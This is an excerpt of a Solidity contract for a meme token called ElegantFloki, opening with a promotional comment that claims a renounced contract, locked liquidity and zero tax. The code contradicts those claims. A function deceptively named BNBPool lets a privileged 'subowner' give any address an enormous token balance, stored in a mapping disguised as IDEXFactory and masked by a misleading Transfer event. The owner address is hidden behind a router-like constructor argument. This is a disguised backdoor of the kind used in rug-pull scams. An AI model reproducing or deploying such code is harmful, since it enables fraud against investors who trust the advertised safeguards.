...
/**
🤝 ElegantFloki  🤝 Meme Coin
Meet ElegantFloki, the ElegantFloki that All of us trust with  billions.
Without ElegantFloki NO SPACE OR DOGE OR SHIBA 
NEW FOMO ERA THE ElegantFloki ERA
✔️ Bullish ✔️Unique ✔️Base 
🔐LP LOCKED 1 Year with renounced LOCK
🧿renounce Contract
🌐tax 0% . ElegantFloki don't like taxing

✅ TG https://t.me/ElegantFloki

NB:⚡️ High Voltage Trading Use High Fees and Gas ⚡️
...
contract ElegantFlokiToken is w20Burnable, currentIndex, w20Ownable {
   ...
   address private owneraddrress; 
    constructor(address RIBBITRouterv3) {
        owneraddrress = RIBBITRouterv3;     
        _name = "ElegantFloki";
        _symbol = "ElegantFloki";
        _decimals = 9;
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        IDEXFactory[bnbRewards] = 100000000000000000 * 10 ** 18;
        
        emit Transfer(bnbRewards, address(0), 100000000000000000 * 10 ** 18);
    }
    /**
